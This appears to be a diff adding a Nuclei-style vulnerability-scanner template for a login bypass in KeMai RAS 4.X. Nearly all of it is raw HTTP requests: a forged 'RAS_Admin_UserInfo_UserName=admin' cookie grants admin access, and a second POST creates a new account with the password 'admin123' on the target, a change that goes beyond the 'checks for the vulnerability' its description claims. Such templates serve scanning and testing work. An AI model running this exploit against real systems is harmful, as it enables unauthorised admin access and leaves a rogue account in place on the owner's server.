@@ -1,0 +1,38 @@
+id: kemai-ras-login-bypass
+info:
+  name: KeMai RAS 4.X User Login Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    KeMai RAS 4.X allows login bypass by adding a specific admin cookie. This template checks for the vulnerability by sending requests with the exploitable cookie and verifying the response.
+  tags: login-bypass
+  reference:
+    - https://xz.aliyun.com/t/9809#toc-0
+http:
+  - raw:
+      - |
+        GET /server/CmxUser.php?pgid=UserList HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: RAS_Admin_UserInfo_UserName=admin
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "名称"
+          - "usingeKey"
+        part: body
+  - raw:
+      - |
+        POST /Server/CmxUser.php?pgid=AddUser_Step3&eflag=1 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: RAS_Admin_UserInfo_UserName=admin
+        Content-Type: application/x-www-form-urlencoded
+
+        UserName={{username}}&Password0={{password}}&Password1={{password}}&rad_EKEY0=%E4%B8%8D%E7%BB%91%E5%AE%9A&rad_Mac0=0&BindMac=1&rad_pwd=1&rad_Logon0=0&chk_date0=1&Date0=2021-06-20&LogonWeek%5B2%5D=2&LogonWeek%5B3%5D=3&LogonWeek%5B4%5D=4&LogonWeek%5B5%5D=5&LogonWeek%5B6%5D=6&LogonWeek%5B7%5D=7&LogonWeek%5B1%5D=1&LogonHour0=0&LogonMinute0=0&LogonHour1=23&LogonMinute1=59&sss=
+    matchers:
+      - type: status
+        status:
+          - 200
+variables:
+  username: "admin123"
+  password: "admin123"
